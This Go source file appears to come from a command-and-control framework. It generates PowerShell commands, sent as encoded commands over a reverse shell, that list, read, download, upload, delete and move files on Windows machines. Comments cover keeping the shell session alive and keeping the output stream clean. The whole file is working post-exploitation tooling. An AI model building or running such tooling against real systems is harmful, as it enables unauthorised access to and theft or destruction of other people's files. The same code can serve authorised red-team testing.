package shell

import (
	"encoding/base64"
	"fmt"
	"strconv"
	"strings"
	"unicode/utf16"
)

// encodePS encodes a PowerShell script as UTF-16LE base64 for -EncodedCommand.
func encodePS(script string) string {
	u := utf16.Encode([]rune(script))
	b := make([]byte, len(u)*2)
	for i, r := range u {
		b[2*i] = byte(r)
		b[2*i+1] = byte(r >> 8)
	}
	return base64.StdEncoding.EncodeToString(b)
}

// finish turns a PowerShell script body into a command for the host: executed
// directly on a PowerShell host, or via -EncodedCommand on a cmd.exe host (and
// as the safe fallback when the interpreter is unknown). -EncodedCommand is
// immune to cmd.exe quoting and to PowerShell variable expansion, which makes
// it correct for BOTH host kinds.
func (t target) finish(script string) (string, error) {
	// A terminating error (e.g. a failed [IO.File] call) would otherwise
	// propagate out of the reverse shell's `iex` and tear down the session.
	// Wrapping turns such failures into ordinary output instead.
	script = "try{" + script + "}catch{$_|Out-String}"
	if t.psHost() {
		// Silence progress records (e.g. "Preparing modules for first use.")
		// that PowerShell would otherwise serialize onto the reverse-shell
		// stream as CLIXML and corrupt the command's output.
		script = "$ProgressPreference='SilentlyContinue';" + script
		if len(script) > winPSCmdLimit {
			return "", fmt.Errorf("command too long for a PowerShell shell bot (%d > %d)", len(script), winPSCmdLimit)
		}
		return script, nil
	}
	// A known cmd.exe host gets its own powershell.exe child; discard that
	// child's stderr so its CLIXML progress/error records cannot contaminate the
	// shared reverse-shell stream. Intentional errors are already turned into
	// stdout by the try/catch wrapper above. Only a *confirmed* cmd host gets
	// `2>NUL`: on an unknown interpreter the parent may itself be PowerShell,
	// where `2>NUL` would create a file named NUL instead of redirecting.
	cmd := "powershell -NoProfile -EncodedCommand " + encodePS(script)
	if t.env == EnvCmd {
		cmd += " 2>NUL"
	}
	if len(cmd) > winCmdLimit {
		return "", fmt.Errorf("command too long for a cmd shell bot (%d > %d)", len(cmd), winCmdLimit)
	}
	return cmd, nil
}

// ---------------------------------------------------------------------------
// PowerShell script bodies (shared by the PowerShell-host and cmd-host paths).
// ---------------------------------------------------------------------------

func psGetCwd() string { return "(Get-Location).Path" }

func psListDir(path string) string {
	p := psLiteral(path)
	// Emit machine-parseable "DIR <size> <name>" / "FILE <size> <name>" lines.
	// Format-Table is deliberately avoided: its right-aligned Length column is
	// empty for directories, so a directory whose name is numeric or begins with
	// a digit (e.g. "123", "1abc") was misread as a size + truncated name and
	// lost its leading digits (or its whole name). Test-Path keeps misses
	// locale-independent; the explicit empty check preserves "Empty directory".
	return "if(Test-Path -LiteralPath " + p + " -PathType Container){" +
		"$c2i=@(Get-ChildItem -Force -LiteralPath " + p + ");" +
		"if($c2i.Count -eq 0){'Empty directory'}" +
		"else{$c2i | ForEach-Object { $c2t=if($_.PSIsContainer){'DIR'}else{'FILE'};" +
		"$c2s=if($_.PSIsContainer){0}else{$_.Length};$c2t + ' ' + $c2s + ' ' + $_.Name }}" +
		"}elseif(Test-Path -LiteralPath " + p + " -PathType Leaf){'Error: ' + " + p + " + ' is a file'}" +
		"else{'Error: path not found: ' + " + p + "}"
}

// psReadHead base64-encodes at most maxBytes from the head of a file. OpenRead
// (not ReadAllBytes) keeps memory bounded for huge files; errors are captured
// as text so a missing/unreadable file never terminates the reverse shell.
func psReadHead(path string, maxBytes int) string {
	return "$c2fs=$null;try{$c2fs=[IO.File]::OpenRead(" + psLiteral(path) + ");" +
		"$c2n=[int][Math]::Min(" + strconv.Itoa(maxBytes) + ",$c2fs.Length);" +
		"$c2b=New-Object byte[] $c2n;$c2r=$c2fs.Read($c2b,0,$c2n);" +
		"[Convert]::ToBase64String($c2b,0,$c2r)}catch{$_|Out-String}finally{if($c2fs){$c2fs.Close()}}"
}

func psReadChunk(path string, offset, length int64) string {
	n := strconv.FormatInt(length, 10)
	body := "$c2fs=$null;try{$c2fs=[IO.File]::OpenRead(" + psLiteral(path) + ");" +
		"$c2fs.Seek(" + strconv.FormatInt(offset, 10) + ",[IO.SeekOrigin]::Begin)|Out-Null;" +
		"$c2b=New-Object byte[] " + n + ";$c2r=$c2fs.Read($c2b,0," + n + ");" +
		"[Convert]::ToBase64String($c2b,0,$c2r)}catch{$_|Out-String}finally{if($c2fs){$c2fs.Close()}}"
	p := psLiteral(path)
	// Frame the base64 payload with sentinels (see winReadBegin) so merged
	// stderr noise cannot corrupt the decode; missing prints the missing marker.
	return "if(Test-Path -LiteralPath " + p + " -PathType Leaf){" +
		psLiteral(winChunkBegin) + ";" + body + ";" + psLiteral(winChunkEnd) +
		"}else{" + psLiteral(winChunkMissing) + "}"
}

func psFileSize(path string) string {
	p := psLiteral(path)
	// Guard with Test-Path: Get-Item on a missing path is a *non-terminating*
	// error, and ($null).Length is 0, so an unguarded read reports size 0 and a
	// download of a missing file would silently produce an empty local file.
	// The size is framed by sentinels so merged stderr noise (e.g. CLIXML)
	// cannot corrupt the numeric parse.
	return "if(Test-Path -LiteralPath " + p + " -PathType Leaf){" +
		psLiteral(winSizeBegin) + ";" +
		"try{(Get-Item -LiteralPath " + p + ").Length}catch{" + psLiteral(winSizeMissing) + "};" +
		psLiteral(winSizeEnd) +
		"}else{" + psLiteral(winSizeMissing) + "}"
}

func psWriteBase64(path, b64 string) string {
	return "$c2d=Split-Path -Parent " + psLiteral(path) + ";" +
		"if($c2d){[IO.Directory]::CreateDirectory($c2d)|Out-Null};" +
		"[IO.File]::WriteAllBytes(" + psLiteral(path) + ",[Convert]::FromBase64String('" + b64 + "'))"
}

func psAppendBase64(path, b64 string) string {
	return "$c2fs=$null;try{$c2fs=[IO.File]::Open(" + psLiteral(path) +
		",[IO.FileMode]::Append,[IO.FileAccess]::Write,[IO.FileShare]::Read);" +
		"$c2b=[Convert]::FromBase64String('" + b64 + "');$c2fs.Write($c2b,0,$c2b.Length)}finally{if($c2fs){$c2fs.Close()}}"
}

func psTruncateCreate(path string) string {
	return "$c2d=Split-Path -Parent " + psLiteral(path) + ";" +
		"if($c2d){[IO.Directory]::CreateDirectory($c2d)|Out-Null};" +
		"[IO.File]::WriteAllBytes(" + psLiteral(path) + ",(New-Object byte[] 0))"
}

func psCreateFile(path string) string {
	p := psLiteral(path)
	// Match the native agents: create the parent and a 0-byte file only if it
	// does not already exist (New-Item -Force would truncate an existing file).
	return "$c2d=Split-Path -Parent " + p + ";" +
		"if($c2d){[IO.Directory]::CreateDirectory($c2d)|Out-Null};" +
		"if(-not (Test-Path -LiteralPath " + p + ")){[IO.File]::WriteAllBytes(" + p + ",(New-Object byte[] 0))}"
}

func psMakeDir(path string) string {
	return "New-Item -ItemType Directory -Force -Path " + psLiteral(path) + "|Out-Null"
}

// psRemove is a best-effort recursive delete (used to clean up temp files).
func psRemove(path string) string {
	return "Remove-Item -Recurse -Force -LiteralPath " + psLiteral(path) + " -ErrorAction SilentlyContinue"
}

// psDelete removes path, enforcing the requested kind (file vs directory) like
// the native agents: deleting a file as a directory (or vice versa) is refused
// instead of silently wiping the wrong thing.
func psDelete(path string, wantDir bool) string {
	p := psLiteral(path)
	if wantDir {
		return "if(Test-Path -LiteralPath " + p + " -PathType Container){" +
			"Remove-Item -Recurse -Force -LiteralPath " + p + " -ErrorAction SilentlyContinue" +
			"}else{'Error: ' + " + p + " + ' is not a directory'}"
	}
	return "if(Test-Path -LiteralPath " + p + " -PathType Container){" +
		"'Error: ' + " + p + " + ' is a directory'" +
		"}else{Remove-Item -Force -LiteralPath " + p + " -ErrorAction SilentlyContinue}"
}

// psRename renames path to a bare newName in the same directory. It uses
// Move-Item -Force (not Rename-Item) because Rename-Item refuses to overwrite
// an existing destination, which would break the temp-file -> target rename
// used by upload/edit_file (the original always exists).
func psRename(path, newName string) (string, error) {
	if newName == "" || strings.ContainsAny(newName, `/\`) {
		return "", fmt.Errorf("new_name must be a bare name without path separators")
	}
	dest := remoteJoin(remoteParent(path), newName, target{os: "Windows"})
	return "Move-Item -Force -LiteralPath " + psLiteral(path) + " -Destination " + psLiteral(dest), nil
}

// psEnsureParent prefaces a script with creation of its destination's parent
// directory, matching the native agents (which MkdirAll the destination before
// copy/move).
func psEnsureParent(path string) string {
	return "$c2d=Split-Path -Parent " + psLiteral(path) + ";if($c2d){[IO.Directory]::CreateDirectory($c2d)|Out-Null};"
}

func psCopy(src, dest string) string {
	return psEnsureParent(dest) +
		"Copy-Item -Recurse -Force -LiteralPath " + psLiteral(src) + " -Destination " + psLiteral(dest)
}

func psMove(src, dest string) string {
	return psEnsureParent(dest) +
		"Move-Item -Force -LiteralPath " + psLiteral(src) + " -Destination " + psLiteral(dest)
}

// psWrappedRead emits a sentinel-wrapped, size-bounded read of the whole file
// for editing; missing is printed when the path is not a regular file.
func psWrappedRead(path, begin, end, missing string, maxBytes int) string {
	return "if(Test-Path -LiteralPath " + psLiteral(path) + " -PathType Leaf){" +
		psLiteral(begin) + ";" + psReadHead(path, maxBytes) + ";" + psLiteral(end) +
		"}else{" + psLiteral(missing) + "}"
}

// psReadLineRange scans the file for byte offsets of lines [start,end] and
// returns that exact byte range base64-encoded. Scanning is bounded to one
// read buffer; only the selected range is retained, so a large file does not
// need to fit in memory. Line terminators are preserved verbatim.
func psReadLineRange(path string, start, end, maxBytes int) string {
	p := psLiteral(path)
	return "if(Test-Path -LiteralPath " + p + " -PathType Leaf){" +
		"$c2fs=[IO.File]::OpenRead(" + p + ");" +
		"try{" +
		"$c2buf=New-Object byte[] 65536;" +
		"$c2line=0;$c2pos=0;$c2start=-1;$c2end=-1;$c2len=$c2fs.Length;$c2done=$false;" +
		"while(-not $c2done){" +
		"$c2n=$c2fs.Read($c2buf,0,$c2buf.Length);" +
		"if($c2n -le 0){break};" +
		"for($c2i=0;$c2i -lt $c2n;$c2i++){" +
		"if($c2line -eq " + strconv.Itoa(start-1) + " -and $c2start -lt 0){$c2start=$c2pos+$c2i};" +
		"if($c2buf[$c2i] -eq 10){" +
		"$c2line++;" +
		"if($c2start -ge 0 -and $c2line -ge " + strconv.Itoa(end) + "){$c2end=$c2pos+$c2i+1;$c2done=$true;break}" +
		"}" +
		"};" +
		"$c2pos += $c2n" +
		"};" +
		"if($c2start -lt 0){" + psLiteral(winRangeMissing) + "}" +
		"else{" +
		"if($c2end -lt 0){$c2end=$c2len};" +
		"if(($c2end-$c2start) -gt " + strconv.Itoa(maxBytes) + "){" + psLiteral(winRangeTooBig) + "}" +
		"else{" +
		"$c2ml=[int]($c2end-$c2start);" +
		psLiteral(winReadBegin) + ";" +
		"$c2fs.Position=$c2start;" +
		"$c2b=New-Object byte[] $c2ml;" +
		"$c2r=$c2fs.Read($c2b,0,$c2ml);" +
		"[Convert]::ToBase64String($c2b,0,$c2r);" +
		psLiteral(winReadEnd) +
		"}" +
		"}" +
		"}finally{if($c2fs){$c2fs.Close()}}" +
		"}else{" + psLiteral(winReadMissing) + "}"
}
